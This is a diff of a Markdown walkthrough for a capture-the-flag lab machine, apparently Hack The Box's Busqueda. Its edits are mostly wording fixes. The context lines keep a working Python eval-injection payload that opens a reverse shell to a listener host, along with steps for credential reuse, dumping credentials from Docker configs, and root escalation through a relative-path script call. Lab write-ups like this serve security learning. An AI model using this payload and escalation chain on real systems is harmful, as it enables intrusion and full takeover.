@@ -3,6 +3,7 @@
 ![machine](assets/machine.png)
 
 Target host: 10.129.205.63
+
 Performed TCP portscan.
 ```go
 └──╼ $./rustscan -a 10.129.205.63 -- -sV -sC -A
@@ -107,8 +108,6 @@ Clicking on the searchor link brings us to the github page with the source code.
 
 While searching through the pull request history, I found [this](https://github.com/ArjunSharda/Searchor/pull/130) thread which talks about how the use of the eval function was removed from the application.
 
-Knowing this information means that we should be able to exploit this to get a reverse shell.
-
 ## Reverse Shell
 In order to exploit the target we will need to perform the following tasks
 - Intercept the request sent from the client to the server
@@ -121,18 +120,13 @@ The following is the payload I used to get a reverse shell on the target machine
 engine=Amazon&query=heythere'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",443));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'%2c'a'%2c'single'))%2b'
 ```
 
-The first line and a half in the payload that is required to urlencoded is the following.
-```go
-+eval(compile('for x in range(1):\n import time\n 
-```
-
-For those who dont know, the eval() function evaluates python code and executes it if it valid.
+For those who dont know, the eval() function evaluates python code and executes it, if it is valid.
 
 The compile() function is required to be used in the statement because eval() only accepts dictonary objects. Therefore wrapping the payload in compile() creates an object that can be executed with eval().
 
-The rest of the reverse shell payload is just a generic python reverse shell that can generated with Reverse Shell Generator [here](https://www.revshells.com/)
+The rest of the reverse shell payload is just a generic python reverse shell that can generated with [Reverse Shell Generator](https://www.revshells.com/)
 
-The request we will sending with burpsuite to a reverse shell is below.
+The request we will sending with burpsuite is below.
 ```
 POST /search HTTP/1.1
 Host: searcher.htb
@@ -176,7 +170,7 @@ $ cat config
 
 We can also see a url which leads to a self hosted gitea service and the subdomain its hosted on.
 
-After adding `gitea.searcher.htb` to our /etc/hosts file, navigating to `http://gitea.searcher.htb/` presents the following page.
+After adding `gitea.searcher.htb` to our `/etc/hosts` file, navigating to `http://gitea.searcher.htb/` presents the following page.
 ![4](assets/4.png)
 
 Navigating to the login page up in the top right corner of the interface, we should be able to login with the credentials we just found.
@@ -195,7 +189,6 @@ svc:x:1000:1000:svc:/home/svc:/bin/bash
 
 Using the credentials for cody, I'm going assume that I can use them to log into ssh with the svc user.
 
-Login Successful!
 ```go
 svc@10.129.204.222's password: 
 Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)
@@ -236,9 +229,10 @@ See https://ubuntu.com/esm or run: sudo pro status
 
 Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
 ```
+Login Successful!
 
 ## Privilege Escalation
-From here I attempt to elevate the user root with `sudo -l`
+From here I attempt to elevate the user to root with `sudo -l`
 ```go
 Matching Defaults entries for svc on busqueda:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -247,7 +241,7 @@ User svc may run the following commands on busqueda:
     (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
 ```
 
-When we attempt to execute the system-checkup script with python with `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *`, we see the following output.
+When we attempt to execute the system-checkup script with `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *` and see the following output.
 ```go
 Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
 
@@ -257,14 +251,14 @@ Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
 
 ```
 
-When we execute `docker-ps` as the script suggests, we can see the gitea service running and a mysql database.
+When we execute `docker-ps` as the script suggests, we can see a gitea and mysql instance running.
 ```go
 CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
 960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 6 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
 f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 6 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
 ```
 
-when I attempt to execute docker-inspect, I get the following output.
+when I attempt to execute `docker-inspect`, I get the following output.
 ```go
 Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
 ```
@@ -276,7 +270,7 @@ At the bottom of the page I stumbled upon the following.
 docker inspect --format='{{json .Config}}' $INSTANCE_ID
 ```
 
-Using the `--format` part of the command, I try executing the system-checkup script.
+Using the `--format` part of the command, I try executing the `system-checkup` script.
 ```go
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' gitea
 ```
@@ -301,9 +295,9 @@ The command above produces the following output.
 
 The output above isn't the full response, I've just reformatted it and extracted the most useful information.
 
-As seen in the output above, this includes credentials for the Gitea user in the Gitea database.
+As seen in the output above, this includes credentials for the gitea user in the gitea database.
 
-When we inspect configuration for the mysql database with the following command.
+When we inspect the configuration for the mysql database with the following command.
 ```go
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
 ```
@@ -327,7 +321,7 @@ We also see the following parsed output.
 
 Unfortunely, the credentials for the root user in the msql database are not same as the root credentials for the user on the machine.
 
-However when we go back to the `http://gitea.searcher.htb` and login with the Administrator, we find that we are successful!
+However when we go back to the `http://gitea.searcher.htb` and login with the Administrator, we find that we are successful with the standard mysql password!
 ![6](assets/6.png)
 
 When we navigate to the Administrators profile, we find an interesting repo named scripts. The scripts repo contains all the scripts that are owned by root on the machine and are located in `/opt/scripts`.
@@ -410,7 +404,7 @@ if __name__ == '__main__':
 
 ```
 
-The code blocks are we need to take the most notice of are below.
+The code blocks that we need to take the most notice of are below.
 ```go
 def run_command(arg_list):
     r = subprocess.run(arg_list, capture_output=True)
@@ -436,10 +430,10 @@ Run_command takes a list of arguments, executes them with bash and parses the ou
 
 When the full-checkup option is received by the script, it assumes that the first argument will be `full-checkup.sh`.
 
-Since the script assumes that `full-checkup.sh` is going to be executed in the same directory as `system-checkup.py` instead of specifiying the full path to the script. This means that we can exploit this functionaility for root by passing a malicious `full-checkup.sh` script instead.
+Since the script assumes that `full-checkup.sh` is going to be executed in the same directory as `system-checkup.py` and does not specify the full path to the script, this means that we can exploit this functionaility to escalate our privileges to root by passing a malicious `full-checkup.sh` script instead.
 
 ## Root Shell
-To exploit I this I performed the following.
+To exploit this I performed the following.
 ```bash
 cd /home/svc
 mkdir .m0
